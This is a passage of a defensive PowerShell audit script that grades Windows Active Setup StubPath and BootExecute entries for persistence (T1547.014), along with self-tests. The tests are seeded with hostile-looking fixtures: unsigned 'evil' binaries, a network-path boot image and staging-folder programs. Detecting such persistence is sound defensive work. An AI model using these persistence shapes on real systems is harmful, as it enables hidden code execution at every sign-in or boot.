    for ($i = 0; $i -lt $tokens.Count; $i++) {
        $t = [string]$tokens[$i].Text
        $u = [regex]::Match($t, '(?i)(?:https?|ftp|file)://\S+')
        if ($u.Success) { $items.Add(@{ Kind = 'url'; Text = $u.Value }); continue }
        $n = [regex]::Match($t, '(?:^|[\s:=,;({])(\\\\[^\\\s]\S*)')
        if ($n.Success) { $items.Add(@{ Kind = 'unc'; Text = (Get-CutPath $n.Groups[1].Value) }); continue }
        $d = [regex]::Match($t, '(?:^|[\s:=,;({])([A-Za-z]:[\\/].*)$')
        if ($d.Success) {
            $whole = [string]$d.Groups[1].Value
            $p = Get-CutPath $whole
            if (-not $tokens[$i].Quoted -and (Get-FileFacts $p $Probe $DriveKind).State -eq 'absent') {
                # An unquoted path may hold spaces: take the following words
                # while that names a file that exists; failing that, up to
                # the first word that ends like a file.
                $acc = $whole; $lex = ''; $lexAt = -1
                for ($j = $i + 1; $j -lt $tokens.Count -and $j -le $i + 8; $j++) {
                    if ($tokens[$j].Quoted) { break }
                    $acc = $acc + ' ' + [string]$tokens[$j].Text
                    $q = Get-CutPath $acc
                    if ((Get-FileFacts $q $Probe $DriveKind).State -ne 'absent') { $p = $q; $i = $j; $lex = ''; break }
                    if (-not $lex -and $q -match $script:CodeExtRx) { $lex = $q; $lexAt = $j }
                }
                if ($lex -and $p -notmatch $script:CodeExtRx) { $p = $lex; $i = $lexAt }
            }
            $items.Add(@{ Kind = 'path'; Text = $p }); continue
        }
        $b = [regex]::Match($t, '^([^\\/:*?"<>|,]+\.[A-Za-z0-9]{1,5})(?:[,#].*)?$')
        if ($b.Success -and $b.Groups[1].Value -match $script:CodeExtRx) { $items.Add(@{ Kind = 'bare'; Text = $b.Groups[1].Value }); continue }
        if ($t -match '[\\/]' -and (Get-CutPath $t) -match $script:CodeExtRx) { $items.Add(@{ Kind = 'rel'; Text = (Get-CutPath $t) }); continue }
        $h = [regex]::Match($t, $script:HostNameRx)
        if ($h.Success) { $items.Add(@{ Kind = 'host'; Text = $h.Value }) }
    }
    return @($items.ToArray())
}

# PURE. One Active Setup entry. Returns @{ Sev; Line; File } -- File is the
# program when it is a local file that exists (for the "when:" line).
function Get-StubVerdict {
    param([string]$Component, [string]$Stub, [string]$IsInstalled,
          [scriptblock]$Probe, [scriptblock]$DriveKind, [scriptblock]$Which,
          [string]$SystemRoot = $env:SystemRoot, [string]$SystemDrive = '', [string]$Shown = '', [int]$Depth = 0)
    if (-not $SystemDrive) { $SystemDrive = $SystemRoot.Substring(0, 2) }
    # The raw text decides what runs (a doubled space in a folder name is
    # part of the name); the one-line form is only for display.
    $raw = ([string]$Stub).Trim()
    $s = $Shown
    if (-not $s) { $s = ($raw -replace '[\r\n\t]+', ' ') }
    $label = "Active Setup '$Component'"
    if ($Depth -eq 0 -and [string]$IsInstalled -eq '0') { return @{ Sev = 'OK'; File = ''; Line = "[INFO] $label is switched off (IsInstalled=0), so Windows does not run it: $s" } }
    $x = $raw
    try { $x = [Environment]::ExpandEnvironmentVariables($raw) } catch {}
    foreach ($rx in @($script:StrongContent + $script:LauncherContent)) {
        if ($x -match $rx) { return @{ Sev = 'CRITICAL'; File = ''; Line = "[CRITICAL] $label StubPath carries attack-shaped command content ($rx) and runs at every user's next sign-in: $s (T1547.014)" } }
    }
    if (Test-StagingText $x) {
        $ft = Get-FirstToken $x
        if (Test-StagingText $ft) { return @{ Sev = 'CRITICAL'; File = ''; Line = "[CRITICAL] $label StubPath runs $ft from a staging path at every user's next sign-in: $s (T1547.014)" } }
        return @{ Sev = 'CRITICAL'; File = ''; Line = "[CRITICAL] $label StubPath hands a file in a staging path to $(Get-WinLeaf $ft) at every user's next sign-in: $s (T1547.014)" }
    }
    $r = Resolve-StubProgram -Line $x -Probe $Probe -DriveKind $DriveKind -Which $Which -SystemRoot $SystemRoot -SystemDrive $SystemDrive
    if ($r.Shape -eq 'none') { return @{ Sev = 'WARNING'; File = ''; Line = "[WARNING] $label StubPath names no file this check could resolve: $s -- read it by hand (T1547.014)." } }
    if ($r.Shape -eq 'notlocal') { return @{ Sev = 'WARNING'; File = ''; Line = "[WARNING] $label StubPath names a program that is not a plain file on a local fixed drive ($($r.Program)) -- not opened by this audit; it would run from there at every user's next sign-in: $s (T1547.014)." } }
    if ($r.Shape -eq 'notfound') {
        $tried = @($r.Tried)
        if ($r.ArgOnly -or $r.BareWord) { return @{ Sev = 'OK'; File = ''; Line = "[INFO] $label StubPath names no program, only arguments ($s) -- nothing by that name where Windows would look from this account (no $($tried -join ', ')); another account's own PATH folders are not visible from here." } }
        if ($r.Bare) { return @{ Sev = 'WARNING'; File = ''; Line = "[WARNING] $label StubPath names a program without its folder ($(Get-FirstToken $x)), and this account's search path does not hold it: a file by that name on a user's search path would run at every user's next sign-in: $s (T1547.014)." } }
        $outside = @($tried | Where-Object { -not (Test-AdminOnlyPath $_ $SystemRoot) })
        if ($tried.Count -eq 0 -or $outside.Count) {
            $where = [string]$r.First
            if ($outside.Count) { $where = [string]$outside[0] }
            return @{ Sev = 'WARNING'; File = ''; Line = "[WARNING] $label names $where, which is not on disk, in a folder outside Windows and Program Files: a file placed there later runs at every user's next sign-in -- a left-behind entry, or one waiting for its file: $s (T1547.014)." }
        }
        return @{ Sev = 'OK'; File = ''; Line = "[INFO] $label names $($tried[-1]), which is not on disk -- a stale entry under a folder only an administrator can write: Windows' attempt fails and nothing runs. ($s)" }
    }
    $p = [string]$r.Program
    $f = $r.Facts
    $leaf = (Get-WinLeaf $p).ToLowerInvariant()
    if ($r.ArgOnly -or ($r.BareWord -and -not (Test-UnderWindows $p $SystemRoot))) {
        return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath names no program, only arguments ($s), and Windows would find $p for it: that file runs at every user's next sign-in -- read what it is (T1547.014)." }
    }
    if ($script:ScriptExt -contains ([regex]::Match($leaf, '\.[^.]*$').Value)) { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath runs a script file at every user's next sign-in: $s -- read what it runs (T1547.014)." } }
    $st = [string]$f.State
    if ($st -eq 'unread') { return @{ Sev = 'WARNING'; File = ''; Line = "[WARNING] $label names $p, whose file could not be read ($($f.Why)) -- not graded: $s (T1547.014)." } }
    if ($st -eq 'unverified') { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label runs $p at every user's next sign-in, and its signature could not be verified ($($f.Why)): $s (T1547.014)." } }
    if ($st -ne 'signed') { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label runs $p at every user's next sign-in, and it is not validly signed ($($f.Status)): $s (T1547.014)." } }
    if ($script:ScriptHosts -contains $leaf) {
        # `cmd /C start X` runs X: grade X as the whole line. Only that shape,
        # with no other cmd syntax and no variable cmd would expand later.
        if ($leaf -eq 'cmd.exe' -and $Depth -lt 2 -and $x -notmatch '[&|<>^%!]') {
            $c = [regex]::Match([string]$r.Rest, '^(?i)\s*(?:/D\s+)?/C\s+start\s+([^\s"/].*)$')
            if ($c.Success) {
                return (Get-StubVerdict -Component $Component -Stub $c.Groups[1].Value -IsInstalled $IsInstalled -Probe $Probe -DriveKind $DriveKind -Which $Which -SystemRoot $SystemRoot -SystemDrive $SystemDrive -Shown $s -Depth ($Depth + 1))
            }
        }
        return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath runs a script host at every user's next sign-in: $s -- read what it runs (T1547.014)." }
    }
    if ($f.Microsoft -and -not (Test-AdminOnlyPath $p $SystemRoot)) {
        return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath runs a Microsoft-signed program from outside Windows and Program Files ($p) at every user's next sign-in -- the shape of a system file copied elsewhere to load what sits beside it: $s (T1547.014)." }
    }
    # A Microsoft-signed program is judged on everything it is handed (its
    # tools take URLs, network paths and data files as payloads); another
    # vendor's signed program on code files and on being told to run a host.
    $strict = [bool]$f.Microsoft
    $isDllHost = ($script:DllHosts -contains $leaf)
    $shownTarget = $p; $shownCN = [string]$f.CN; $dllSeen = $false; $staleDll = ''
    foreach ($it in @(Get-HandedItems -Rest ([string]$r.Rest) -Probe $Probe -DriveKind $DriveKind)) {
        $kind = [string]$it.Kind; $text = [string]$it.Text
        $handedLeaf = (Get-WinLeaf (Get-NormalWinPath $text)).ToLowerInvariant()
        if ($kind -eq 'host' -or (($kind -eq 'path' -or $kind -eq 'bare') -and ($script:HostLeaves -contains $handedLeaf -or $script:HostLeaves -contains ($handedLeaf + '.exe')))) {
            return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands the work on to another host ($text) through $leaf at every user's next sign-in: $s -- read what it runs (T1547.014)." }
        }
        if (-not $strict) {
            if ($kind -ne 'path' -or $text -notmatch $script:CodeExtRx) { continue }
            $g = Get-FileFacts $text $Probe $DriveKind
            if ($g.State -eq 'unsigned' -or $g.State -eq 'unverified') { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands $leaf a file that is not validly signed ($($g.RealPath)) at every user's next sign-in: $s (T1547.014)." } }
            continue
        }
        if ($kind -eq 'url') { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands $leaf an address ($text) at every user's next sign-in: $s -- a Windows program fetching or opening it is not evidence of what comes back (T1547.014)." } }
        if ($kind -eq 'unc') { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands $leaf a network path ($text) -- not opened by this audit; what is there is used at every user's next sign-in: $s (T1547.014)." } }
        if ($kind -eq 'rel') { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands $leaf a relative path ($text) that this check cannot place: $s -- read it by hand (T1547.014)." } }
        $path = $text
        if ($kind -eq 'bare') {
            $path = ''
            if ($isDllHost) {
                $cand = Join-WinPath (Join-WinPath $SystemRoot 'System32') $text
                $cs = [string](Get-FileFacts $cand $Probe $DriveKind).State
                if ($cs -ne 'absent' -and $cs -ne 'notlocal') { $path = $cand }
            }
            if (-not $path) { try { $path = [string](& $Which $text) } catch { $path = '' } }
            if (-not $path) { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath names $text for $leaf, and this account's search path does not hold it: a file by that name on a user's search path would be used at every user's next sign-in: $s (T1547.014)." } }
        }
        $g = Get-FileFacts $path $Probe $DriveKind
        if ($g.State -eq 'dir') { continue }
        if ($g.State -eq 'notlocal') { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands $leaf a path that is not a plain file on a local fixed drive ($($g.RealPath)) -- not opened by this audit: $s (T1547.014)." } }
        if ($g.State -eq 'absent') {
            if (Test-AdminOnlyPath ([string]$g.RealPath) $SystemRoot) { if (-not $staleDll) { $staleDll = [string]$g.RealPath }; continue }
            return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands $leaf a file that is not there ($($g.RealPath)), outside Windows and Program Files: a file placed there later is used at every user's next sign-in: $s (T1547.014)." }
        }
        if ($g.State -eq 'unread') { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands $leaf a file that could not be read ($($g.RealPath): $($g.Why)) -- not graded: $s (T1547.014)." } }
        if ($g.State -ne 'signed') { return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath hands $leaf a file that is not validly signed ($($g.RealPath)) at every user's next sign-in: $s (T1547.014)." } }
        if ($isDllHost -and -not $dllSeen) { $dllSeen = $true; $shownTarget = [string]$g.RealPath; $shownCN = [string]$g.CN }
    }
    if ($isDllHost -and $strict -and -not $dllSeen) {
        if ($staleDll) { return @{ Sev = 'OK'; File = ''; Line = "[INFO] $label names $staleDll, which is not on disk -- a stale entry under a folder only an administrator can write: Windows' attempt fails and nothing runs. ($s)" } }
        return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath names no file this check could resolve: $s -- read it by hand (T1547.014)." }
    }
    if ($strict -and (Test-UnderWindows $p $SystemRoot) -and $script:StockSetupPrograms -notcontains $leaf) {
        return @{ Sev = 'WARNING'; File = $p; Line = "[WARNING] $label StubPath runs $leaf, a Windows tool this check knows no Active Setup use for, at every user's next sign-in: $s -- read what it does; its signature says who made the tool, not what it is told to do (T1547.014)." }
    }
    return @{ Sev = 'OK'; File = $p; Line = "[OK] ${label}: $shownTarget (signed by $shownCN) <- $s" }
}

# PURE. All Installed Components roots. $Roots: @( @{ Root; Required; State =
# ok|nokey|unreadable; Error; Unread = @(names); Entries = @( @{ Key; Name;
# Stub; IsInstalled } ) } ).
function Get-ActiveSetupReport {
    param([object[]]$Roots, [scriptblock]$Probe, [scriptblock]$DriveKind, [scriptblock]$Which, [string]$SystemRoot = $env:SystemRoot, [string]$SystemDrive = '')
    $lines = New-Object System.Collections.Generic.List[string]
    $sev = 'OK'; $gap = 'OK'; $n = 0
    $hits = New-Object System.Collections.Generic.List[object]
    foreach ($r in @($Roots)) {
        if ($r.State -eq 'nokey') {
            if ($r.Required) { $lines.Add("[WARNING] Active Setup check NOT performed -- $($r.Root) is not there. Every Windows has it, so the read did not reach the real key; a command run at each user's sign-in would go unseen (T1547.014)."); $gap = 'WARNING' }
            continue
        }
        if ($r.State -eq 'unreadable') {
            $lines.Add("[WARNING] Active Setup check NOT performed -- $($r.Root) could not be read ($($r.Error)), so a command run at each user's sign-in would go unseen (T1547.014).")
            $gap = 'WARNING'; continue
        }
        $u = @($r.Unread | Where-Object { $_ })
        if ($u.Count) {
            $lines.Add(("[WARNING] Active Setup check NOT performed for {0} component(s) under {1} that could not be read: {2} -- a StubPath there cannot be audited, and a restricted key is how one would be hidden (T1547.014)." -f $u.Count, $r.Root, ($u -join ', ')))
            $gap = 'WARNING'
        }
        foreach ($e in @($r.Entries)) {
            if (-not ([string]$e.Stub).Trim()) { continue }
            $n++
            $comp = if ($e.Name) { "$($e.Key) ($($e.Name))" } else { [string]$e.Key }
            # A component name is attacker-chosen; an apostrophe in it would
            # end the quoted label every reader of the line splits on.
            $comp = $comp -replace "'", ''
            $x = Get-StubVerdict -Component $comp -Stub ([string]$e.Stub) -IsInstalled ([string]$e.IsInstalled) -Probe $Probe -DriveKind $DriveKind -Which $Which -SystemRoot $SystemRoot -SystemDrive $SystemDrive
            $lines.Add($x.Line)
            if ($x.Sev -ne 'OK') { $sev = Get-MaxSev $sev $x.Sev; $hits.Add(@{ Key = (Join-WinPath $r.Root $e.Key); File = [string]$x.File }) }
        }
    }
    if ($sev -eq 'OK' -and $gap -eq 'OK') { $lines.Add("[OK] Active Setup: $n StubPath command(s) graded, none suspicious.") }
    return @{ Lines = @($lines.ToArray()); Sev = $sev; Gap = $gap; Hits = @($hits.ToArray()) }
}

if ($SelfTest) {
    $fails = 0
    function T { param([string]$N, [bool]$Ok, [string]$Got)
        if ($Ok) { Write-Output "[OK]   $N" } else { Write-Output "[FAIL] $N$(if ($Got) { ": $Got" })"; $script:fails++ }
    }
    # The cases name C:\Windows; %SystemRoot% in a StubPath is expanded from
    # the environment, which pwsh on Linux lacks. Restored before leaving.
    $savedSR = $env:SystemRoot
    $env:SystemRoot = 'C:\Windows'
    $SR = 'C:\Windows'

    # THE PRETEND DISK. A file exists only if it is listed here; the probe's
    # answer for anything else is "absent". Every path the graders open is
    # recorded, so the test can show that a network path never was.
    $script:disk = @{}
    $script:onPath = @{}
    $script:opened = New-Object System.Collections.Generic.List[string]
    function Add-File {
        param([string]$Path, [string]$Kind = 'ms', [string]$Real = '')
        $f = @{ State = 'signed'; CN = 'Microsoft Windows'; Microsoft = $true }
        if ($Kind -eq 'mscorp')   { $f = @{ State = 'signed'; CN = 'Microsoft Corporation'; Microsoft = $true } }
        if ($Kind -eq 'vendor')   { $f = @{ State = 'signed'; CN = 'Example Vendor Ltd'; Microsoft = $false } }
        if ($Kind -eq 'google')   { $f = @{ State = 'signed'; CN = 'Google LLC'; Microsoft = $false } }
        if ($Kind -eq 'gen')      { $f = @{ State = 'signed'; CN = 'Gen Digital Inc.'; Microsoft = $false } }
        if ($Kind -eq 'unsigned') { $f = @{ State = 'unsigned'; Status = 'NotSigned' } }
        if ($Kind -eq 'unread')   { $f = @{ State = 'unread'; Why = 'Access to the path is denied.' } }
        if ($Kind -eq 'dir')      { $f = @{ State = 'dir' } }
        if ($Real) { $f.RealPath = $Real }
        $script:disk[$Path.ToLowerInvariant()] = $f
    }
    $probe = {
        param([string]$p)
        [void]$script:opened.Add($p)
        $f = $script:disk[$p.ToLowerInvariant()]
        if ($f) { return $f }
        return @{ State = 'absent' }
    }
    $dk = { param([string]$l) if ($l -ieq 'C') { 'Fixed' } elseif ($l -ieq 'Z') { 'Network' } elseif ($l -ieq 'E') { 'Removable' } else { 'NoRootDirectory' } }
    # The search path: System32, the Windows folder, then whatever a case put
    # on PATH.
    $which = {
        param([string]$n)
        foreach ($d in 'C:\Windows\System32', 'C:\Windows') {
            $c = ($d + '\' + $n).ToLowerInvariant()
            if ($script:disk.ContainsKey($c) -and $script:disk[$c].State -ne 'dir') { return ($d + '\' + $n) }
        }
        if ($script:onPath.ContainsKey($n.ToLowerInvariant())) { return [string]$script:onPath[$n.ToLowerInvariant()] }
        return ''
    }
    Add-File 'C:\Windows' 'dir'
    foreach ($n in 'rundll32.exe', 'regsvr32.exe', 'cmd.exe', 'wscript.exe', 'cscript.exe', 'mshta.exe', 'msiexec.exe', 'pcalua.exe',
                   'forfiles.exe', 'conhost.exe', 'notepad.exe', 'ie4uinit.exe', 'unregmp2.exe', 'reg.exe', 'sdnative.exe',
                   'shell32.dll', 'url.dll', 'iesetup.dll', 'mscories.dll', 'themeui.dll', 'advpack.dll', 'pcwutl.dll') { Add-File ('C:\Windows\System32\' + $n) }
    Add-File 'C:\Windows\System32\OpenSSH\ssh.exe'
    Add-File 'C:\Program Files\Windows Defender\MpCmdRun.exe' 'mscorp'
    Add-File 'C:\Program Files\Internet Explorer\iexplore.exe' 'mscorp'
    Add-File 'C:\Windows\System32\wbem\WMIC.exe'
    Add-File 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
    Add-File 'C:\Windows\explorer.exe'
    Add-File 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe'
    Add-File 'C:\Windows\System32\aswBoot.exe' 'gen'
    Add-File 'C:\Windows\System32\agent.exe' 'unsigned'
    Add-File 'C:\Windows\System32\evilnat.exe' 'unsigned'
    Add-File 'C:\Program Files\Windows Mail\WinMail.exe'
    Add-File 'C:\Program Files (x86)\Microsoft\Edge\Application\131.0.2903.70\Installer\setup.exe' 'mscorp'
    Add-File 'C:\Program Files\Google\Chrome\Application\131.0.6778.86\Installer\chrmstp.exe' 'google'
    Add-File 'C:\Program Files\Vendor\app.exe' 'vendor'
    Add-File 'C:\Program Files\Vendor\locked.exe' 'unread'
    Add-File 'C:\Program Files\A  B\x.exe' 'vendor'
    Add-File 'C:\Program Files\Common Files\Acme\cache.dat' 'unsigned'
    foreach ($n in 'evil.exe', 'evil.dll', 'x.vbs', 'x.bat', 'x.hta', 'x.msi', 'evil.xml', 'evil.js', 'x.cpl') { Add-File ('C:\ProgramData\Acme\' + $n) 'unsigned' }
    Add-File 'C:\ProgramData\Acme\ie4uinit.exe'
    Add-File 'C:\ProgramData\Acme\native.exe'
    Add-File 'C:\ProgramData\Vendor\agent.exe' 'unsigned'
    Add-File 'C:\ProgramData\Vendor\cfg.xml' 'unsigned'
    Add-File 'C:\ProgramData\Vendor\signed.msi' 'vendor'

    function StubCase { param([string]$Stub, [string]$Inst = '1')
        return (Get-StubVerdict -Component 'dz' -Stub $Stub -IsInstalled $Inst -Probe $probe -DriveKind $dk -Which $which -SystemRoot $SR -SystemDrive 'C:')
    }
    function BootCase { param([hashtable]$Reads)
        return (Get-BootReport -Reads $Reads -Probe $probe -DriveKind $dk -KeyLabel 'SM' -SystemRoot $SR)
    }

    # ---- BootExecute: Windows' own entries (benign twins, verbatim) ----
    # 'autocheck autochk /q /v *' is the CI runner's own value (2026-11-26).
    foreach ($e in @('autocheck autochk *', 'Autocheck Autochk *', 'autocheck autochk /q /v *', 'autocheck autochk /k:C *',
                     'autocheck autochk /k:C /k:D *', 'autocheck autochk /p \??\C:', 'autocheck autochk /m \??\Volume{0b1e2c3d-0000-4000-8000-123456789abc}', 'autochk *')) {
        $v = Get-BootEntryVerdict -Value 'BootExecute' -Entry $e -Image '' -Facts $null -SystemRoot $SR
        T "BootExecute '$e' is Windows' own disk check: [OK], not raised" ($v.Sev -eq 'OK' -and $v.Line -like '`[OK`]*') $v.Line
    }
    T 'autochk with an argument of another shape is not the stock entry' (-not (Test-AutochkEntry 'autocheck autochk * evil')) ''
    T 'the native image is System32\<name>.exe' ((Get-NativeImagePath 'autocheck evilnat /x' -SystemRoot $SR) -eq 'C:\Windows\System32\evilnat.exe') (Get-NativeImagePath 'autocheck evilnat /x' -SystemRoot $SR)
    T 'a \??\ path names the file itself' ((Get-NativeImagePath 'autocheck \??\C:\Users\Public\x.exe' -SystemRoot $SR) -eq 'C:\Users\Public\x.exe') ''
    T 'a \SystemRoot\ native path resolves under the Windows folder' ((Get-NativeImagePath 'autocheck \SystemRoot\System32\evilnat.exe' -SystemRoot $SR) -eq 'C:\Windows\System32\evilnat.exe') (Get-NativeImagePath 'autocheck \SystemRoot\System32\evilnat.exe' -SystemRoot $SR)
    T "'..' is collapsed: a name that climbs out of System32 is not in it" ((Get-NativeImagePath 'autocheck ..\..\ProgramData\Acme\native' -SystemRoot $SR) -eq 'C:\ProgramData\Acme\native.exe') (Get-NativeImagePath 'autocheck ..\..\ProgramData\Acme\native' -SystemRoot $SR)

    $b = BootCase @{ BootExecute = @{ State = 'present'; Value = @('autocheck autochk *', 'autocheck evilnat'); Kind = 'MultiString'; Error = '' } }; $t = $b.Lines -join "`n"
    T 'an unsigned native program added beside autochk is CRITICAL, named with its image' ($b.Sev -eq 'CRITICAL' -and $b.Gap -eq 'OK' -and $t -match "(?m)^\[CRITICAL\] BootExecute entry 'autocheck evilnat' runs .*evilnat\.exe before Windows starts, as SYSTEM, and it is not validly signed") $t
    $b = BootCase @{ BootExecute = @{ State = 'present'; Value = @('autocheck autochk *', 'autocheck \??\C:\Users\Public\x.exe'); Kind = 'MultiString' } }
    T 'a native program in C:\Users\Public is CRITICAL from a staging path' ($b.Sev -eq 'CRITICAL' -and ($b.Lines -join ' ') -match 'staging path') ($b.Lines -join ' | ')
    $b = BootCase @{ BootExecute = @{ State = 'present'; Value = @('autocheck autochk *', 'autocheck aswBoot.exe /A:"*" /L:"enu"'); Kind = 'MultiString' } }
    T 'a validly signed antivirus boot-time scanner is a WARNING naming its signer' ($b.Sev -eq 'WARNING' -and ($b.Lines -join ' ') -match 'signed by Gen Digital Inc\.') ($b.Lines -join ' | ')
    $b = BootCase @{ BootExecute = @{ State = 'present'; Value = @('autocheck autochk *', 'sdnative /boot'); Kind = 'MultiString' } }
    T 'a Microsoft-signed System32 native program is INFO, named, not raised' ($b.Sev -eq 'OK' -and ($b.Lines -join ' ') -match '(?m)\[INFO\] BootExecute entry .sdnative /boot. runs .*sdnative\.exe, validly signed by Microsoft Windows') ($b.Lines -join ' | ')
    $b = BootCase @{ BootExecute = @{ State = 'present'; Value = @('autocheck autochk *', 'autocheck ..\..\ProgramData\Acme\native'); Kind = 'MultiString' } }
    T 'a Microsoft-signed file reached by climbing out of System32 is a WARNING, never the System32 INFO' ($b.Sev -eq 'WARNING' -and ($b.Lines -join ' ') -match 'runs C:\\ProgramData\\Acme\\native\.exe before Windows starts' -and ($b.Lines -join ' ') -notmatch 'in System32; context') ($b.Lines -join ' | ')
    $b = BootCase @{ BootExecute = @{ State = 'present'; Value = @('autocheck nohere'); Kind = 'MultiString' } }
    T 'an image that is not on disk is a WARNING, never OK' ($b.Sev -eq 'WARNING' -and ($b.Lines -join ' ') -match 'not on disk') ($b.Lines -join ' | ')
    $b = BootCase @{ BootExecute = @{ State = 'present'; Value = @('autocheck autochk *', 'autocheck \\203.0.113.7\share\boot'); Kind = 'MultiString' } }
    T 'a BootExecute image on a network path is a WARNING and is not opened' ($b.Sev -eq 'WARNING' -and ($b.Lines -join ' ') -match 'not a plain file on a local fixed drive -- not opened' -and @($b.Hits).Count -eq 0) ($b.Lines -join ' | ')
    $b = BootCase @{ BootExecute = @{ State = 'present'; Value = 'autocheck autochk *'; Kind = 'String' }; SetupExecute = @{ State = 'present'; Value = @('autocheck evilnat'); Kind = 'MultiString' } }
    T 'a sibling value (SetupExecute) is graded by the same rule; a REG_SZ BootExecute is read' ($b.Sev -eq 'CRITICAL' -and ($b.Lines -join ' ') -match "SetupExecute entry 'autocheck evilnat'" -and ($b.Lines -join ' ') -match '\[OK\] BootExecute: autocheck autochk \*') ($b.Lines -join ' | ')
    $all = @{}; foreach ($n in $script:BootValues) { $all[$n] = @{ State = 'absent' } }
    $all.BootExecute = @{ State = 'present'; Value = @('autocheck autochk *', ''); Kind = 'MultiString' }
    $b = BootCase $all
    T 'the stock machine: autochk only, siblings absent, an empty string in the list -- the all-clear, nothing raised' ($b.Sev -eq 'OK' -and $b.Gap -eq 'OK' -and ($b.Lines -join "`n") -match "(?m)^\[OK\] BootExecute and its sibling values hold only Windows' own entries \(1 graded\)\.$") ($b.Lines -join ' | ')
    $b = BootCase @{ BootExecute = @{ State = 'unreadable'; Error = 'SecurityException: Requested registry access is not allowed.' } }
    T 'an unreadable Session Manager key is a raised gap, never the all-clear' ($b.Gap -eq 'WARNING' -and $b.Sev -eq 'OK' -and ($b.Lines -join ' ') -match 'BootExecute check NOT performed' -and ($b.Lines -join ' ') -notmatch '\[OK\]') ($b.Lines -join ' | ')
    $b = BootCase @{ BootExecute = @{ State = 'nokey' } }
    T 'a missing Session Manager key is a gap (every Windows has it)' ($b.Gap -eq 'WARNING' -and ($b.Lines -join ' ') -match 'NOT performed') ($b.Lines -join ' | ')
    $b = BootCase @{ BootExecute = @{ State = 'absent' } }
    T 'an absent BootExecute value is INFO, no gap, no finding' ($b.Gap -eq 'OK' -and $b.Sev -eq 'OK' -and ($b.Lines -join ' ') -match '\[INFO\] BootExecute value absent') ($b.Lines -join ' | ')

    # ---- Active Setup: benign twins, verbatim: must read [OK], on the file named ----
    # MEASURED on the CI runner (2026-11-26): the two iesetup lines. The rest
    # are the forms Windows, Edge and Chrome are known to register; the
    # ClearIconCache line is the one a reviewer recalled and nobody has
    # measured yet -- it earns no exception, it is graded like any line.
    $benign = @(
        @('C:\Windows\System32\ie4uinit.exe -UserConfig', 'ie4uinit.exe'),
        @('"C:\Windows\System32\rundll32.exe" "C:\Windows\System32\iesetup.dll",IEHardenAdmin', 'iesetup.dll'),
        @('"C:\Windows\System32\rundll32.exe" "C:\Windows\System32\iesetup.dll",IEHardenUser', 'iesetup.dll'),
        @('C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install', 'mscories.dll'),
        @('%SystemRoot%\system32\unregmp2.exe /FirstLogon', 'unregmp2.exe'),
        @('%SystemRoot%\system32\regsvr32.exe /s /n /i:/UserInstall %SystemRoot%\system32\themeui.dll', 'themeui.dll'),
        @('regsvr32.exe /s /n /i:U shell32.dll', 'shell32.dll'),
        @('rundll32 C:\Windows\System32\shell32.dll,Control_RunDLL', 'shell32.dll'),
        @('"C:\Program Files\Windows Mail\WinMail.exe" OCInstallUserConfigOE', 'WinMail.exe'),
        @('"C:\Program Files (x86)\Microsoft\Edge\Application\131.0.2903.70\Installer\setup.exe" --configure-user-settings --verbose-logging --system-level --msedge --channel=stable', 'setup.exe'),
        @('"C:\Program Files\Google\Chrome\Application\131.0.6778.86\Installer\chrmstp.exe" --configure-user-settings --verbose-logging --system-level', 'chrmstp.exe'),
        @('C:\Windows\system32\cmd.exe /D /C start C:\Windows\system32\ie4uinit.exe -ClearIconCache', 'ie4uinit.exe'),
        @('msiexec.exe /fup {11111111-2222-3333-4444-555555555555} /qn', 'msiexec.exe'),
        @('msiexec.exe /i C:\ProgramData\Vendor\signed.msi /qn', 'msiexec.exe'),
        @('"C:\Program Files\Vendor\app.exe" /config C:\ProgramData\Vendor\cfg.xml', 'app.exe'),
        @('"C:\Program Files\A  B\x.exe" /first', 'x.exe'))
    foreach ($bn in $benign) {
        $v = StubCase $bn[0]
        $m = [regex]::Match($v.Line, "^\[OK\] Active Setup 'dz': (.+?) \(signed by [^)]+\) <- ")
        T "Active Setup '$($bn[0])' reads [OK] on $($bn[1])" ($v.Sev -eq 'OK' -and $m.Success -and (Get-WinLeaf $m.Groups[1].Value) -eq $bn[1]) $v.Line
    }
    $v = StubCase 'C:\Windows\system32\unregmp2.exe /ShowWMP' '0'
    T "the runner's switched-off entry (IsInstalled=0) is INFO" ($v.Sev -eq 'OK' -and $v.Line -match '^\[INFO\] .*IsInstalled=0') $v.Line
    foreach ($ao in @('/UserInstall', 'U')) {
        $v = StubCase $ao
        T "the runner's argument-only StubPath '$ao' (Themes Setup / Windows Desktop Update) is INFO, not raised" ($v.Sev -eq 'OK' -and $v.Line -match '^\[INFO\] .*names no program, only arguments') $v.Line
    }
    $v = StubCase '"C:\Program Files\Old\gone.exe" /x'
    T 'a quoted program that is gone from Program Files is INFO (stale), never OK and never raised' ($v.Sev -eq 'OK' -and $v.Line -match '^\[INFO\] .*C:\\Program Files\\Old\\gone\.exe, which is not on disk -- a stale entry') $v.Line
    $v = StubCase 'C:\Program Files\Old App\gone.exe /x'
    T 'the same unquoted: every place Windows would try is under Program Files or the drive root, so it is stale too' ($v.Sev -eq 'OK' -and $v.Line -match '^\[INFO\] .*C:\\Program Files\\Old App\\gone\.exe, which is not on disk') $v.Line
    $v = StubCase 'regsvr32.exe /s C:\Windows\System32\gone.dll'
